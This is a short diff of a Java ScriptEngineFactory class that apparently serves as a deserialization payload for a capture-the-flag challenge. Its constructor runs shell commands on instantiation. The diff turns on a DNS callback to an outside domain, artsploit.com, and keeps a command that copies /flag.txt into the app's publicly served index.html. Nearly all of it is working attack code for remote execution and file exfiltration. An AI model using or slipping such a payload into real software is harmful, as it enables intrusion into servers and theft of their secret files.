@@ -9,7 +9,7 @@ public class AwesomeScriptEngineFactory implements ScriptEngineFactory {
 
     public AwesomeScriptEngineFactory() {
         try {
-            //Runtime.getRuntime().exec("dig scriptengine.x.artsploit.com");
+            Runtime.getRuntime().exec("dig scriptengine.x.artsploit.com");
             Runtime.getRuntime().exec("cp /flag.txt /app/build/resources/main/static/index.html");
             
         } catch (IOException e) {
